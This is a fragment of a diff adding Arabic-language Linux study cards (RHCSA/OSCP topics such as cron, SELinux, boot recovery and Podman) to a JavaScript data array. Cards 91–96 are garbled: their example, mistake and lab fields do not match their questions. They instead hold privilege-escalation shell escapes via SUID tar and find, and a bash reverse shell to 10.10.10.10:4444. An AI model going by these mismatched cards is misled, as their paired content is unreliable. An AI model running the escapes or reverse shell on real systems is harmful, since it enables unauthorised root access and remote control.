+                lab: `قم بعمل مزامنة لمجلد محلي مستخدماً rsync وتأكد من نقل الفروقات فقط.`,
+                ref: `man rsync`,
+                related: ['scp', 'cp']
+            },
+            {
+                id: 58,
+                cat: "9️⃣ الأرشفة والجدولة",
+                difficulty: "Intermediate",
+                tags: ['Logs', 'Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
+                q: `ما هو journalctl وما هو rsyslog؟`,
+                a: `journalctl — عرض سجلات systemd-journald (هيكلية). rsyslog — حفظ السجلات في ملفات نصية دائمة (/var/log/messages).`,
+                example: `journalctl -u sshd --since "yesterday"`,
+                mistakes: `البحث اليدوي المتعب في ملفات log الضخمة بدلاً من تصفيتها بـ journalctl الذكي.`,
+                lab: `افحص سجلات محاولات الـ SSH الفاشلة باستخدام خيارات التصفية بـ <code>journalctl</code>.`,
+                ref: `man journalctl / man rsyslog.conf`,
+                related: ['rsyslogd', 'logger']
+            },
+            {
+                id: 59,
+                cat: "9️⃣ الأرشفة والجدولة",
+                difficulty: "Intermediate",
+                tags: ['Logs'],
+                usedIn: ['RHCSA'],
+                q: `ما الفرق بين at و cron؟`,
+                a: `at — مهمة لمرة واحدة في المستقبل. cron — مهام متكررة.`,
+                example: `echo "sh backup.sh" | at 02:00`,
+                mistakes: `استخدام cron لمهام غير متكررة ستنفذ لمرة واحدة فقط.`,
+                lab: `جدول مهمة بسيطة لمرة واحدة بـ <code>at</code> وتحقق منها بـ <code>atq</code>.`,
+                ref: `man at`,
+                related: ['cron', 'sleep']
+            },
+            {
+                id: 60,
+                cat: "9️⃣ الأرشفة والجدولة",
+                difficulty: "Intermediate",
+                tags: ['Logs'],
+                usedIn: ['RHCSA'],
+                q: `كيف تُعد مهمة cron؟`,
+                a: `crontab -e — 5 حقول: دقيقة، ساعة، يوم الشهر، شهر، يوم الأسبوع.`,
+                example: `crontab -e\n0 2 * * * /backup.sh`,
+                mistakes: `خطأ في ترتيب حقول الوقت الخمسة مما يسبب تشغيل المهمة في وقت عشوائي أو متكرر جداً.`,
+                lab: `أنشئ مهمة crontab تطبع رسالة كل دقيقة للملف المؤقت وتأكد من عملها.`,
+                ref: `man 5 crontab`,
+                related: ['cron', 'anacron']
+            },
+            {
+                id: 61,
+                cat: "9️⃣ الأرشفة والجدولة",
+                difficulty: "Intermediate",
+                tags: ['Logs'],
+                usedIn: ['RHCSA'],
+                q: `ما هو anacron ومتى يُستخدم؟`,
+                a: `ينفذ المهام المؤجلة لو كانت الخادم مطفأً أثناء الموعد المجدول (مثل /etc/cron.daily/).`,
+                example: `cat /etc/anacrontab`,
+                mistakes: `الاعتقاد بأن anacron يمكنه جدولة مهام بالدقائق أو الساعات؛ هو يدعم فقط الجدولة بالأيام والأسابيع.`,
+                lab: `افحص ملف الإعدادات <code>/etc/anacrontab</code> لتعلم كيف تدار المهام المجدولة اليومية والأسبوعية.`,
+                ref: `man anacron`,
+                related: ['cron', 'systemd.timer']
+            },
+            {
+                id: 62,
+                cat: "9️⃣ الأرشفة والجدولة",
+                difficulty: "Advanced",
+                tags: ['Logs', 'Systemd'],
+                usedIn: ['RHCSA'],
+                q: `ما هي systemd timers وما مثال عليها؟`,
+                a: `بديل معاصر لـ cron. مثال: systemd-tmpfiles-clean — تنظيف المجلدات المؤقتة تلقائياً.
+🔟 SELinux`,
+                example: `systemctl list-timers`,
+                mistakes: `اعتقاد أن نظام cron كافٍ لجميع الجدولة؛ مؤقتات systemd توفر تتبعاً دقيقاً وحماية أكبر وتكاملاً مع الخدمات.`,
+                lab: `تصفح المؤقتات الفعالة بنظامك وعاين الخدمة المرتبطة بها.`,
+                ref: `man systemd.timer`,
+                related: ['systemctl', 'crond']
+            },
+            {
+                id: 63,
+                cat: "🔟 SELinux",
+                difficulty: "Advanced",
+                tags: ['SELinux', 'Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
+                q: `ما هو SELinux وما الفرق بين MAC و DAC؟`,
+                a: `Security-Enhanced Linux. MAC (Mandatory Access Control) — تحكم إلزامي مستقل حتى عن root. DAC (Discretionary Access Control) — أذونات المستخدم التقليدية.`,
+                example: `getenforce`,
+                mistakes: `تعطيل SELinux كحل فوري لمشاكل صلاحيات البرمجيات؛ هذا يدمر جدار حماية النواة تماماً ويعرض السيرفر للاختراق.`,
+                lab: `افحص وضع SELinux الحالي باستخدام <code>sestatus</code>.`,
+                ref: `man selinux`,
+                related: ['setenforce', 'chcon']
+            },
+            {
+                id: 64,
+                cat: "🔟 SELinux",
+                difficulty: "Advanced",
+                tags: ['SELinux', 'Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
+                q: `ما هي فلسفة SELinux؟`,
+                a: `"المنع الافتراضي" — أي عملية بدون تصريح صريح = حظر، حتى لو كانت root.`,
+                example: `SELinux Default Deny Policy`,
+                mistakes: `افتراض أن تشغيل التطبيق بصلاحية root يمنحه الصلاحيات التلقائية للولوج؛ SELinux يحظره إن لم يصرح له.`,
+                lab: `جرب تشغيل تطبيق غير مصرح له بقراءة مسار محمي وعاين الحظر بسجلات audit.`,
+                ref: `SELinux Security Policy Guide`,
+                related: ['semanage', 'restorecon']
+            },
+            {
+                id: 65,
+                cat: "🔟 SELinux",
+                difficulty: "Advanced",
+                tags: ['SELinux', 'Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
+                q: `ما هي أوضاع SELinux الثلاثة؟`,
+                a: `Enforcing (تطبيق القواعد)، Permissive (تسجيل فقط)، Disabled (معطل).`,
+                example: `setenforce Permissive`,
+                mistakes: `البقاء في وضع Permissive بشكل دائم على الخوادم الحية؛ هذا الوضع للتشخيص والتصحيح فقط.`,
+                lab: `حول الوضع مؤقتاً لـ Permissive لتشخيص مشكلة حظر، ثم أعده لـ Enforcing.`,
+                ref: `man setenforce`,
+                related: ['getenforce', 'sestatus']
+            },
+            {
+                id: 66,
+                cat: "🔟 SELinux",
+                difficulty: "Advanced",
+                tags: ['SELinux', 'Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
+                q: `ما هو Security Context وما هي مكوناته؟`,
+                a: `(المستخدم:الدور:النوع:المستوى). مثال: unconfined_u:object_r:httpd_sys_content_t:s0`,
+                example: `ls -Z /var/www/html`,
+                mistakes: `تعديل الجزء الخاص بالمستخدم أو الدور يدوياً بدلاً من تعديل النوع (Type) وهو الأهم للسياسة التارقتد.`,
+                lab: `افحص الوسم الأمني لمجلد الويب وتعرف على أقسامه الأربعة.`,
+                ref: `RHEL SELinux Context Reference`,
+                related: ['chcon', 'semanage']
+            },
+            {
+                id: 67,
+                cat: "🔟 SELinux",
+                difficulty: "Advanced",
+                tags: ['SELinux', 'Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
+                q: `ما هي Targeted Policy؟`,
+                a: `سياسة RHEL الافتراضية تركز على "النوع" (Type) فقط.`,
+                example: `Targeted vs Strict SELinux policies`,
+                mistakes: `تطبيق سياسة Strict صعبة التخصيص على سيرفرات إنتاجية عادية بدون تدريب مسبق.`,
+                lab: `تحقق من نوع السياسة النشطة بنظامك في ملف التكوين <code>/etc/selinux/config</code>.`,
+                ref: `SELinux Policies Manual`,
+                related: ['sestatus', 'semodule']
+            },
+            {
+                id: 68,
+                cat: "🔟 SELinux",
+                difficulty: "Advanced",
+                tags: ['SELinux', 'Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
+                q: `ما هي SELinux Booleans ولماذا نستخدمها؟`,
+                a: `متغيرات منطقية لتفعيل خصائص استثنائية بدون تغيير السياقات. مثال: setsebool -P httpd_enable_homedirs on`,
+                example: `setsebool -P httpd_enable_homedirs on`,
+                mistakes: `نسيان خيار <code>-P</code> (Persistent) مما يتسبب في ضياع التعديل وعودة المنع بعد الـ reboot.`,
+                lab: `ابحث عن بوليان معين يتعلق بخدمة الويب وفعله بشكل دائم.`,
+                ref: `man getsebool / man setsebool`,
+                related: ['getsebool -a', 'togglesebool']
+            },
+            {
+                id: 69,
+                cat: "🔟 SELinux",
+                difficulty: "Advanced",
+                tags: ['SELinux', 'Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
+                q: `كيف تضيف قاعدة سياق دائمة لمجلد؟`,
+                a: `semanage fcontext -a -t httpd_sys_content_t "/web(/.*)?" ثم restorecon -Rv /web`,
+                example: `semanage fcontext -a -t httpd_sys_content_t "/web(/.*)?" && restorecon -Rv /web`,
+                mistakes: `استخدام <code>chcon</code> للتهيئة؛ صلاحيات chcon مؤقتة وتختفي تماماً بمجرد عمل restorecon للمجلد.`,
+                lab: `اضبط سياق أمان دائم لمجلد ويب مخصص وطبق التغييرات بـ <code>restorecon</code>.`,
+                ref: `man semanage-fcontext`,
+                related: ['restorecon', 'chcon']
+            },
+            {
+                id: 70,
+                cat: "🔟 SELinux",
+                difficulty: "Advanced",
+                tags: ['SELinux', 'Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
+                q: `كيف تحلل أخطاء SELinux؟`,
+                a: `sealert -a /var/log/audit/audit.log أو ausearch -m avc -ts recent`,
+                example: `sealert -a /var/log/audit/audit.log`,
+                mistakes: `محلية الرفض المعقدة بالعين المجردة دون استخدام sealert المساعد.`,
+                lab: `افحص سجل التدقيقAVC وحلله بـ <code>sealert</code> لقراءة التوصيات المقترحة.`,
+                ref: `man sealert / man auditd`,
+                related: ['ausearch', 'auditctl']
+            },
+            {
+                id: 71,
+                cat: "🔟 SELinux",
+                difficulty: "Expert",
+                tags: ['SELinux', 'Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
+                q: `كيف تعطل SELinux بشكل صحيح في RHEL 9؟`,
+                a: `لا تستخدم SELINUX=disabled في /etc/selinux/config! استخدم وسيطة إقلاع النواة: selinux=0 في GRUB.
+1️⃣1️⃣ الإقلاع والإصلاح`,
+                example: `grubby --update-kernel=ALL --args="selinux=0"`,
+                mistakes: `تعطيل SELinux في RHEL 9 بملف التكوين مما يعطل إقلاع النظام; التعطيل الآمن يتم عبر GRUB للنواة.`,
+                lab: `اطلع على معاملات إقلاع الكيرنل الحالية بـ <code>cat /proc/cmdline</code>.`,
+                ref: `RHEL 9 Deprecated SELinux Disabled Mode Guide`,
+                related: ['grub2-mkconfig', 'grubby']
+            },
+            {
+                id: 72,
+                cat: "1️⃣1️⃣ الإقلاع والإصلاح",
+                difficulty: "Advanced",
+                tags: ['Systemd'],
+                usedIn: ['RHCSA'],
+                q: `ما هي مراحل الإقلاع في RHEL؟`,
+                a: `POST → UEFI/BIOS → GRUB2 → Kernel + Initramfs → systemd → Target`,
+                example: `Boot stages hierarchy`,
+                mistakes: `اعتقاد أن GRUB2 يقوم بتحميل نظام التشغيل بالكامل؛ هو فقط يحمل النواة و initramfs للذاكرة.`,
+                lab: `راجع ملف تكوين الـ GRUB وتعرف على سطر تحميل النواة.`,
+                ref: `RHEL Boot Process Reference Guide`,
+                related: ['grub2-install', 'systemd-analyze']
+            },
+            {
+                id: 73,
+                cat: "1️⃣1️⃣ الإقلاع والإصلاح",
+                difficulty: "Advanced",
+                tags: ['Systemd'],
+                usedIn: ['RHCSA'],
+                q: `ما هو Initramfs؟`,
+                a: `صورة أولية تحتوي برامج تشغيل العتاد لتركيب نظام الملفات الجذري قبل تسليم التحكم لـ systemd.`,
+                example: `lsinitrd /boot/initramfs-$(uname -r).img | head`,
+                mistakes: `حذف أو تلف ملف initramfs؛ مما يسبب شلل الكيرنل عن قراءة الأقراص وتوقف الإقلاع بـ kernel panic.`,
+                lab: `افتح واستعرض محتويات ملف initramfs بنظامك وتعرف على مشغلات الأقراص داخله.`,
+                ref: `man initramfs`,
+                related: ['dracut', 'mkinitrd']
+            },
+            {
+                id: 74,
+                cat: "1️⃣1️⃣ الإقلاع والإصلاح",
+                difficulty: "Advanced",
+                tags: ['Systemd'],
+                usedIn: ['RHCSA'],
+                q: `ما هي أهداف systemd (Targets) المهمة؟`,
+                a: `graphical.target (مستوى 5)، multi-user.target (مستوى 3)، rescue.target (صيانة محدودة)، emergency.target (صيانة حرجة).`,
+                example: `systemctl isolate multi-user.target`,
+                mistakes: `الخلط بين rescue.target و emergency.target؛ الأخير لا يركب نظام الملفات الجذري ويمنح شل صيانة حرجاً جداً.`,
+                lab: `انتقل مؤقتاً للواجهة السطرية بـ <code>isolate</code> وتأكد من إغلاق الواجهة الرسومية.`,
+                ref: `man systemd.special`,
+                related: ['systemctl set-default', 'reboot']
+            },
+            {
+                id: 75,
+                cat: "1️⃣1️⃣ الإقلاع والإصلاح",
+                difficulty: "Advanced",
+                tags: ['Systemd'],
+                usedIn: ['RHCSA'],
+                q: `كيف تغير الهدف الافتراضي؟`,
+                a: `systemctl set-default multi-user.target`,
+                example: `systemctl set-default multi-user.target`,
+                mistakes: `الاعتقاد بأن تغيير التارقت يعطل إمكانية استخدام الواجهة الرسومية لاحقاً؛ يمكنك الانتقال يدوياً دائماً.`,
+                lab: `غيّر هدف الإقلاع الافتراضي للنظام إلى الواجهة السطرية وتحقق بعد عمل reboot.`,
+                ref: `systemctl default targets documentation`,
+                related: ['systemctl isolate', 'get-default']
+            },
+            {
+                id: 76,
+                cat: "1️⃣1️⃣ الإقلاع والإصلاح",
+                difficulty: "Advanced",
+                tags: ['Systemd'],
+                usedIn: ['RHCSA'],
+                q: `كيف تستعيد كلمة مرور root بدون قرص خارجي؟`,
+                a: `أوقف الإقلاع في GRUB2
+عدل سطر النواة وأضف rd.break
+mount -o remount,rw /sysroot
+chroot /sysroot
+passwd root
+touch /.autorelabel ⬅️ مهم جداً لـ SELinux!
+exit و reboot`,
+                example: `rd.break kernel parameter procedure`,
+                mistakes: `نسيان كتابة <code>touch /.autorelabel</code> مما يمنعك من استخدام كلمة المرور الجديدة لرفض SELinux لها.`,
+                lab: `جرب محاكاة استعادة الباسورد على سيرفر تجريبي لتعتاد الخطوات الحيوية للامتحان.`,
+                ref: `RHEL Root Password Recovery`,
+                related: ['chroot', 'passwd']
+            },
+            {
+                id: 77,
+                cat: "1️⃣1️⃣ الإقلاع والإصلاح",
+                difficulty: "Advanced",
+                tags: ['SELinux', 'Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
+                q: `لماذا touch /.autorelabel ضروري بعد تغيير كلمة مرور root؟`,
+                a: `لأن /etc/shadow الجديد يفتقد سياق SELinux الصحيح. .autorelabel يجبر النظام على إعادة مسح السياقات قبل الإقلاع.`,
+                example: `touch /.autorelabel`,
+                mistakes: `تجاوز هذه الخطوة بعد تغيير باسورد الـ root؛ مما يسبب حظراً كاملاً للدخول بعد الـ reboot.`,
+                lab: `تفحص ملفات النظام وتعرف على كيفية عمل ميزة الوسم التلقائي عند الإقلاع.`,
+                ref: `SELinux Autorelabel Guide`,
+                related: ['restorecon', 'semanage']
+            },
+            {
+                id: 78,
+                cat: "1️⃣1️⃣ الإقلاع والإصلاح",
+                difficulty: "Advanced",
+                tags: ['Storage'],
+                usedIn: ['RHCSA'],
+                q: `كيف تصلح خطأ في /etc/fstab يمنع الإقلاع؟`,
+                a: `يدخلك النظام Emergency Shell تلقائياً. عدل /etc/fstab → systemctl daemon-reload → reboot.
+1️⃣2️⃣ الأتمتة والحاويات`,
+                example: `mount -o remount,rw /`,
+                mistakes: `محاولة تعديل fstab وهو للقراءة فقط (Read-only) في طور الطوارئ دون إعادة تركيبه بصلاحية كتابة.`,
+                lab: `ادخل لطور الطوارئ وجرب تعديل fstab لإصلاح مسار تركيب خاطئ.`,
+                ref: `Emergency Mode Recovery Manual`,
+                related: ['fstab', 'mount']
+            },
+            {
+                id: 79,
+                cat: "1️⃣2️⃣ الأتمتة والحاويات",
+                difficulty: "Advanced",
+                tags: ['Containers'],
+                usedIn: ['RHCSA'],
+                q: `ما هو Kickstart وما مكونات ملفه؟`,
+                a: `نظام تثبيت آلي. يحتوي على: autopart, clearpart, %packages, %post (سكربتات ما بعد التثبيت).`,
+                example: `Kickstart file installation syntax`,
+                mistakes: `استخدام خيارات تثبيت خاطئة في ملف ks.cfg تسبب توقف عملية الأتمتة.`,
+                lab: `افحص ملف الـ Kickstart الخاص بـ Anaconda المتواجد بمجلد الـ root وافهم خياراته.`,
+                ref: `RHEL Kickstart Reference`,
+                related: ['ksvalidator', 'anaconda']
+            },
+            {
+                id: 80,
+                cat: "1️⃣2️⃣ الأتمتة والحاويات",
+                difficulty: "Advanced",
+                tags: ['Containers'],
+                usedIn: ['RHCSA'],
+                q: `كيف تتحقق من صحة ملف Kickstart؟`,
+                a: `ksvalidator /path/to/ks.cfg`,
+                example: `ksvalidator /root/anaconda-ks.cfg`,
+                mistakes: `استخدام الملف مباشرة في التثبيت دون التحقق؛ وجود خطأ نحوي بسيط سيفشل عملية التثبيت بالشبكة.`,
+                lab: `شغل أداة الفحص على ملف Kickstart محلي وافحص تقرير الأخطاء.`,
+                ref: `man ksvalidator`,
+                related: ['anaconda', 'pxe']
+            },
+            {
+                id: 81,
+                cat: "1️⃣2️⃣ الأتمتة والحاويات",
+                difficulty: "Expert",
+                tags: ['Containers'],
+                usedIn: ['RHCSA'],
+                q: `ما هو KVM وما ميزته؟`,
+                a: `Kernel-based Virtual Machine — يحول نواة Linux إلى Hypervisor. أداء مباشر للعتاد + عزل عبر SELinux (sVirt).`,
+                example: `virt-install --name my-vm --ram 2048 ...`,
+                mistakes: `تشغيل أجهزة افتراضية دون تفعيل SELinux/sVirt، مما يتيح للـ VM المخترق الوصول لبقية الـ VMs الأخرى.`,
+                lab: `افحص حالة خدمة الكوكبت لإدارة الأجهزة الوهمية وقم بتفعيل sVirt.`,
+                ref: `KVM/sVirt Security Guide`,
+                related: ['virsh', 'virt-manager']
+            },
+            {
+                id: 82,
+                cat: "1️⃣2️⃣ الأتمتة والحاويات",
+                difficulty: "Advanced",
+                tags: ['Containers'],
+                usedIn: ['RHCSA'],
+                q: `ما هي Cockpit وما تضيفه حزمة cockpit-machines؟`,
+                a: `واجهة ويب لإدارة RHEL. cockpit-machines تضيف إدارة VMs (إنشاء، تعديل، Snapshots).`,
+                example: `systemctl enable --now cockpit.socket`,
+                mistakes: `محاولة تثبيت خدمات ويب ثقيلة ومعقدة بينما توفر حزمة cockpit-machines لوحة متكاملة مدمجة.`,
+                lab: `ثبت خدمة الكوكبيت وقم بالولوج إليها عبر المنفذ 9090 بالمتصفح.`,
+                ref: `Cockpit Project Documentation`,
+                related: ['cockpit-machines', 'virt-viewer']
+            },
+            {
+                id: 83,
+                cat: "1️⃣2️⃣ الأتمتة والحاويات",
+                difficulty: "Intermediate",
+                tags: ['Containers'],
+                usedIn: ['RHCSA'],
+                q: `ما الفرق بين VMs والحاويات (Containers)?`,
+                a: `VMs = نظام تشغيل كامل لكل تطبيق. Containers = تتشارك النواة، تعزل التطبيق + مكتباته فقط.`,
+                example: `VMs vs Containers Architecture`,
+                mistakes: `اختيار VM ثقيل لتطبيق ويب صغير ومعزول بدلاً من تغليفه داخل حاوية خفيفة وسريعة.`,
+                lab: `قارن استهلاك الذاكرة الإجمالي لسيرفر وهمي مقابل حاوية تشغل نفس تطبيق الويب.`,
+                ref: `NIST Container Security Guidelines`,
+                related: ['podman', 'docker']
+            },
+            {
+                id: 84,
+                cat: "1️⃣2️⃣ الأتمتة والحاويات",
+                difficulty: "Expert",
+                tags: ['Containers'],
+                usedIn: ['RHCSA'],
+                q: `ما هي آليات عزل الحاويات في Linux؟`,
+                a: `Namespaces (عزل العمليات/الشبكة/التخزين) + cgroups (تقنين الموارد).`,
+                example: `Namespaces and cgroups configuration`,
+                mistakes: `تشغيل حاويات دون تحديد سقف لاستهلاك الذاكرة (cgroups) مما يتيح للحاوية استهلاك كامل رامات السيرفر وتجميده.`,
+                lab: `افحص مجلدات cgroups تحت <code>/sys/fs/cgroup</code> لتفهم آلية الحد من موارد المعالجة.`,
+                ref: `Linux Namespaces and Cgroups Manual`,
+                related: ['podman run -m', 'systemd-cgtop']
+            },
+            {
+                id: 85,
+                cat: "1️⃣2️⃣ الأتمتة والحاويات",
+                difficulty: "Advanced",
+                tags: ['Containers'],
+                usedIn: ['RHCSA'],
+                q: `ما هي أدوات Podman الثلاثة؟`,
+                a: `podman (تشغيل/إدارة حاويات)، skopeo (فحص صور السجلات)، buildah (بناء صور مخصصة).`,
+                example: `podman run / skopeo inspect / buildah bud`,
+                mistakes: `الاعتقاد بأن podman أداة احتكارية؛ هي أداة مفتوحة المصدر بالكامل ومتوافقة مع معايير OCI القياسية للاتحاد.`,
+                lab: `استخدم skopeo لفحص صورة حاوية في سجل بعيد دون تنزيلها بالكامل للقرص.`,
+                ref: `Podman/Skopeo/Buildah Project Docs`,
+                related: ['podman', 'docker']
+            },
+            {
+                id: 86,
+                cat: "1️⃣2️⃣ الأتمتة والحاويات",
+                difficulty: "Advanced",
+                tags: ['Containers'],
+                usedIn: ['RHCSA'],
+                q: `ما هي Rootless Containers؟`,
+                a: `حاويات يشغلها مستخدم عادي — حتى لو اخترقت، المهاجم لا يملك صلاحيات root على المضيف.`,
+                example: `podman run --user 1000:1000 ...`,
+                mistakes: `تشغيل حاويات بامتيازات root بشكل دائم؛ مما يمكن المهاجم من السيطرة الكاملة على السيرفر في حال اختراق الحاوية.`,
+                lab: `شغل حاوية ويب بصفتك مستخدم عادي (Rootless) وتأكد من عدم وجود أي عملية لـ root تخصها.`,
+                ref: `Podman Rootless Mode Guide`,
+                related: ['podman', 'namespaces']
+            },
+            {
+                id: 87,
+                cat: "1️⃣2️⃣ الأتمتة والحاويات",
+                difficulty: "Advanced",
+                tags: ['Containers', 'SELinux', 'Defensive'],
+                usedIn: ['RHCSA', 'Defensive'],
+                q: `ما معنى -v host_dir:container_dir:Z في Podman؟`,
+                a: `ربط مجلد مضيف بالحاوية + :Z = تعديل سياق SELinux تلقائياً.`,
+                example: `podman run -v /host/data:/container/data:Z ...`,
+                mistakes: `إغفال كتابة علم <code>:Z</code> (أو <code>:z</code>) مما يؤدي لحجب كامل للبيانات داخل الحاوية من قبل SELinux.`,
+                lab: `شغل حاوية ويب مع ربط مجلد من المضيف وجرب قراءته بدون ومع إضافة علم الـ Z.`,
+                ref: `Podman Volume mount & SELinux`,
+                related: ['restorecon', 'semanage']
+            },
+            {
+                id: 88,
+                cat: "1️⃣2️⃣ الأتمتة والحاويات",
+                difficulty: "Advanced",
+                tags: ['Containers', 'Systemd'],
+                usedIn: ['RHCSA'],
+                q: `كيف تدمج حاوية Podman مع systemd؟`,
+                a: `podman generate systemd --new container_name > ~/.config/systemd/user/container.service ثم systemctl --user enable --now container.service`,
+                example: `podman generate systemd --new --name my_app -f`,
+                mistakes: `نسيان خيار <code>--new</code> مما يمنع systemd من إنشاء الحاوية تلقائياً عند الإقلاع وتدميرها عند الإيقاف.`,
+                lab: `قم بتوليد سرفس systemd لحاوية نشطة واختبر تشغيلها وإيقافها بالكامل عبر كود الخدمات.`,
+                ref: `man podman-generate-systemd`,
+                related: ['systemctl --user', 'loginctl']
+            },
+            {
+                id: 89,
+                cat: "1️⃣2️⃣ الأتمتة والحاويات",
+                difficulty: "Advanced",
+                tags: ['Containers', 'Systemd'],
+                usedIn: ['RHCSA'],
+                q: `ما هو loginctl enable-linger ولماذا نستخدمه؟`,
+                a: `يبقي جلسة المستخدم نشطة بعد تسجيل الخروج — ضروري لخدمات الحاويات التي تعمل في الخلفية.`,
+                example: `loginctl enable-linger username`,
+                mistakes: `تفعيل خدمات الحاويات للمستخدمين وتوقع استمرار عملها بعد خروجهم دون تفعيل خيار linger.`,
+                lab: `فعل خيار linger لمستخدم تجريبي، وسجل خروجك وتأكد من بقاء حاوياته قيد العمل بالخلفية.`,
+                ref: `man loginctl`,
+                related: ['systemctl --user', 'ssh']
+            },
+            {
+                id: 90,
+                cat: "1️⃣2️⃣ الأتمتة والحاويات",
+                difficulty: "Advanced",
+                tags: ['Containers', 'Networking'],
+                usedIn: ['RHCSA'],
+                q: `ما هي netavark في Podman؟`,
+                a: `مدير شبكات داخلي بديل متفوق لتيسير اتصالات DNS بين الحاويات في RHEL 9.
+🏆 أسئلة سيناريو (Scenario-Based)`,
+                example: `podman network create my_net`,
+                mistakes: `الاعتقاد بأن netavark أداة يدوية؛ هي محرك داخلي آلي بالكامل ينفذ إعدادات شبكة البودمان في RHEL 9.`,
+                lab: `أنشئ شبكة بودمان مخصصة وافحص ملف التكوين الخاص بها وسجلاتها.`,
+                ref: `Netavark Github Documentation`,
+                related: ['podman network', 'ip link']
+            },
+            {
+                id: 91,
+                cat: "🏆 أسئلة سيناريو (Scenario-Based)",
+                difficulty: "Red Team",
+                tags: ['GTFOBins', 'Privilege Escalation'],
+                usedIn: ['OSCP', 'Offensive'],
+                q: `سيناريو: خادمك بطيء جداً. كيف تكتشف العملية المستهلكة؟`,
+                a: `top أو htop لترتيب العمليات حسب CPU/RAM. ps aux --sort=-%cpu للترتيب. kill -15 PID لإنهاء سلمي.`,
+                example: `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`,
+                mistakes: `الاعتقاد بأن جميع الأوامر آمنة طالما لا تعدل ملفات النظام؛ خيارات التشغيل الفرعية للأدوات قد تؤدي لكسر أمني كامل.`,
+                lab: `أنشئ بيئة افتراضية تجريبية مع تفعيل SUID للـ tar وجرب تطبيق الهروب.`,
+                ref: `GTFOBins Official Reference (tar SUID)`,
+                related: ['find', 'vim', 'bash']
+            },
+            {
+                id: 92,
+                cat: "🏆 أسئلة سيناريو (Scenario-Based)",
+                difficulty: "OSCP",
+                tags: ['Capabilities', 'Privilege Escalation'],
+                usedIn: ['OSCP', 'Offensive'],
+                q: `سيناريو: تريد مشاركة مجلد بين فريق العمل. ما الخطوات؟`,
+                a: `mkdir /shared && chgrp team /shared
+chmod 2770 /shared (SetGID + rwx للمالك والمجموعة)
+chmod g+s /shared (تأكد من SetGID)
+أضف المستخدمين للمجموعة: usermod -aG team user1`,
+                example: `getcap -r / 2>/dev/null`,
+                mistakes: `الاعتماد على فحص SUID فقط وتجاهل الـ Capabilities التي أصبحت البديل الحديث والأكثر تخفياً لترقية الصلاحيات.`,
+                lab: `ابحث في نظامك عن الملفات التي تمتلك قدرة <code>cap_net_raw</code> أو غيرها.`,
+                ref: `man getcap / man setcap`,
+                related: ['find', 'setcap']
+            },
+            {
+                id: 93,
+                cat: "🏆 أسئلة سيناريو (Scenario-Based)",
+                difficulty: "Red Team",
+                tags: ['GTFOBins', 'Privilege Escalation'],
+                usedIn: ['OSCP', 'Offensive'],
+                q: `سيناريو: تريد توسيع مساحة /data بنسبة 20% بدون إيقاف النظام.`,
+                a: `vgdisplay vg_name — تأكد من المساحة الحرة
+lvextend -l +20%FREE /dev/vg_name/lv_data
+xfs_growfs /data`,
+                example: `find . -exec /bin/sh -p \; -quit`,
+                mistakes: `نسيان كتابة علم <code>-p</code> في الأنظمة الحديثة التي تقوم بتصفير صلاحيات الغروب والمستخدم تلقائياً عند تشغيل sh.`,
+                lab: `عيّن صلاحية SUID لأداة find في مجلد تجريبي وجرب الهروب.`,
+                ref: `GTFOBins find exploitation`,
+                related: ['tar', 'vim', 'awk']
+            },
+            {
+                id: 94,
+                cat: "🏆 أسئلة سيناريو (Scenario-Based)",
+                difficulty: "OSCP",
+                tags: ['Bash Internals', 'Privilege Escalation'],
+                usedIn: ['OSCP', 'Offensive'],
+                q: `سيناريو: تطبيق ويب لا يعمل بسبب SELinux. كيف ت diagnosticate؟`,
+                a: `journalctl -xe أو /var/log/audit/audit.log
+sealert -a /var/log/audit/audit.log
+إذا كان الحل Booleans: setsebool -P httpd_can_network_connect on
+إذا كان الحل Context: semanage fcontext + restorecon`,
+                example: `bash -i >& /dev/tcp/10.10.10.10/4444 0>&1`,
+                mistakes: `كتابة المسار في شل آخر غير Bash (مثل zsh أو sh) حيث لن يتم تفسيره كـ socket بل كملف غير موجود.`,
+                lab: `افتح منفذاً محلياً بـ nc وجرب إرسال نص من طرفية أخرى باستخدام <code>/dev/tcp</code>.`,
+                ref: `Bash Builtin Features (/dev/tcp)`,
+                related: ['exec', 'nc', 'curl']
+            },
+            {
+                id: 95,
+                cat: "🏆 أسئلة سيناريو (Scenario-Based)",
+                difficulty: "Expert",
+                tags: ['Bash Internals'],
+                usedIn: ['RHCSA', 'OSCP'],
+                q: `سيناريو: تريد نسخ احتياطي يومي لـ /home إلى خادم بعيد.`,
+                a: `rsync -avz --delete /home/ user@backup-server:/backups/home/ + cron job يومي الساعة 2 صباحاً.`,
+                example: `coproc myjob { socat - -; }\necho "hello" >&\${myjob[1]}\nread response <&\${myjob[0]}`,
+                mistakes: `استخدام الحلقات العادية أو علامة <code>&</code> البسيطة التي لا تتيح لك قراءة مخرجات العملية بالوقت الفعلي بأمان.`,
+                lab: `أنشئ مهمة coproc بسيطة وجرب تمرير مدخلات وقراءة النتائج برمجياً.`,
+                ref: `Bash coproc manual`,
+                related: ['exec', 'jobs', 'bg']
+            },
+            {
+                id: 96,
+                cat: "🏆 أسئلة سيناريو (Scenario-Based)",
+                difficulty: "Intermediate",
+                tags: ['Defensive', 'Logs'],
+                usedIn: ['RHCSA', 'Defensive'],
+                q: `سيناريو: تريد تثبيت 100 خادم RHEL بشكل آلي.`,
+                a: `Kickstart file على خادم ويب + PXE boot أو inst.ks=http://server/ks.cfg في GRUB.`,
+                example: `faillock --user admin --reset # لفك القفل`,
+                mistakes: `استخدام أدوات قديمة مثل pam_tally2 التي تم إزالتها واستبعادها بالكامل في RHEL 9.`,
+                lab: `قم بمحاكاة 5 تسجيلات دخول خاطئة لمستخدم تجريبي، وتحقق من قفله بـ <code>faillock</code>.`,
+                ref: `man faillock / man pam_faillock`,
+                related: ['authselect', 'secure']
+            },
+            {
+                id: 97,
+                cat: "🏆 أسئلة سيناريو (Scenario-Based)",
+                difficulty: "Expert",
+                tags: ['Defensive', 'Logs'],
+                usedIn: ['RHCSA', 'Defensive'],
